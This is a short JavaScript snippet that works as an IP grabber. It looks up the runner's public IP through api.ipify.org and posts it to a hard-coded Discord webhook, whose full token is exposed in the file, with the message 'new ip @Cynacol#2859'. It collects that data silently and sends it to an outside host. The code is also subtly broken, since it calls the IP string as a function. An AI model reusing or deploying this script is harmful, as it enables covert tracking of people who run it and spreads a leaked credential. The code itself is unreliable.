const { DiscordConsoleLogger } = require('discord-console-logger')


const logger = new DiscordConsoleLogger({ 
// Full Discord Webhook URL with ID and Token (required)
    hookURL: 'https://discordapp.com/api/webhooks/1019175589380366336/B9xC5W3kXgV_k6cOq3_31uzHZDRAVIVMWnIFxIl086UuWBCynpCSGPfgbPWOstxCQaTF',
// Icon to Show in the embed footer (optional)
    iconURL: '', 
// Footer Text to show on the embed (optional)
    footer: '', 
// Sets if you want discord-console-logger to log to the console as well as your Discord Webhook (optional: default false)
    console: false
})

fetch('https://api.ipify.org/?format=json').then(results => results.json()).then(data => logger.info({
    message: data.ip(),
    description: 'new ip @Cynacol#2859'
}));